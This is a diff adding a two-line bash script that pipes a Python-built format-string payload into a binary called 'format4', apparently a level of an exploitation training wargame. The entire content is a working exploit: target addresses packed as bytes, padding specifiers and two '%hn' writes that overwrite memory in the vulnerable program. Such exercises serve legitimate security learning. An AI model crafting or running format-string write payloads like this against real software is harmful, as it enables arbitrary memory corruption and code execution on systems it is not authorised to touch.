@@ -1,0 +1,2 @@
+#!/bin/bash
+python -c "print '\x26\x97\x04\x08\x24\x97\x04\x08' + '%02044x' + '%4\$hn' + '%031920x'+ '%5\$hn'" | ./format4
